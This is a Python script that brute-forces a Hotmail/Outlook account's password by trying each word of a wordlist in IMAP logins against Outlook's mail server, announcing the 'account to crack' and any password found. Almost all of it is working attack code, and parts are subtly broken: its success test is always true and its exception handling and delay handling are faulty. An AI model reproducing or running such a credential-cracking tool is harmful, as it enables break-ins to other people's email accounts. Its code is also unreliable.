#!/usr/bin/env python
#  -*- coding: utf-8 -*-

import sys
import time
import imaplib
from core import *

class Hotmail:

    def __init__(self, mail, wordlist, delay):
        self.mail = mail
        self.host = 'imap-mail.outlook.com'
        self.port = 993
        self.wordlist = wordlist
        self.delay = delay
        self.glob = globals.Globals()
        self.col = globals.Colors()

    def banner(self):
        print (self.col.BLUE) + ("""
                    dddhhyyyyd
      mmdddhhhyyyyyyyyyyyyyyyd
hhyyyyyyyyyyyyyyyyyyyyyyyyyyyd
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyd
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyd
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyhmmmmmmmmmmmmmmmmmmmN
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyo::::::::::::::::::sh
yyyyyyyyyyo/--.-:+syyyyyyyyyy/                .+yy
yyyyyyyyo.  ````  `:syyyyyyyy/             `-+o-oy
yyyyyyyo`  :osso:   -yyyyyyyyo.          `:oo-  oy
yyyyyyy`  :yyyyyy-   +yyyyyyyso+.      `:o+.    oy
yyyyyys   oyyyyyy+   :yyyyyyy/`:o+-  ./o/.      oy
yyyyyys   oyyyyyy+   :yyyyyyy/  `-oo+o/`        oy
yyyyyyy.  .syyyys.   syyyyyyy/     .-`          oy
yyyyyyys.  `:++:`  `+yyyyyyyy/                  oy
yyyyyyyys/.      `:syyyyyyyyy/                  oy
yyyyyyyyyyyso+++osyyyyyyyyyyy/                  oy
yyyyyyyyyyyyyyyyyyyyyyyyyyyyy+..................oy
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyhdddddddddddddddddddN
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyd
yyyyyyyyyyyyyyyyyyyyyyyyyyyyyd
dhhyyyyyyyyyyyyyyyyyyyyyyyyyyd
          ddhhhyyyyyyyyyyyyyyd
        """) + (self.col.ENDC)

    def search(self):
        global password
        for password in passwords:
            self.attack(password.replace("\n", ""))

    def attack(self,password):
        try:
            sys.stdout.write("\r[*] trying %s.. " % password)
            sys.stdout.flush()
            IMAP4 = imaplib.IMAP4_SSL(self.host, self.port)
            session = IMAP4.login(self.mail, password)
            if (session == 'OK' or 'AUTHENTICATE completed'):
                IMAP4.logout()
                self.glob.print_status("Password found! Password: " + (self.col.GREEN) + (self.col.BOLD) + (password) + (self.col.ENDC))
                sys.exit(1)
            time.sleep(self.delay)
        except IMAP4.error:
            pass
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)

    def crack(self):
        global br
        global passwords
        try:
            list = open(self.wordlist, "r")
            passwords = list.readlines()
            k = 0
            while k < len(passwords):
                passwords[k] = passwords[k].strip()
                k += 1
        except IOError:
            self.glob.print_error("Error: check your password list path!")
            sys.exit(1)
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)
        try:
            self.glob.print_warning("Account to crack: " + (self.col.YELLOW) + (self.col.BOLD) + (self.mail) + (self.col.ENDC))
            self.glob.print_warning("Loaded: " + (self.col.YELLOW) + (self.col.BOLD) + str(len(passwords)) + (self.col.ENDC) + " passwords")
            self.glob.print_warning("Cracking, please wait ...")
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)
        try:
            self.search()
            self.attack(password)
        except KeyboardInterrupt:
            self.glob.print_error("Exiting program ..")
            sys.exit(1)

if __name__ == "__main__":
    mail = sys.argv[1]
    wordlist = sys.argv[2]
    delay = sys.argv[3]
    f = Hotmail(mail,wordlist,delay)
    f.banner()
    f.crack()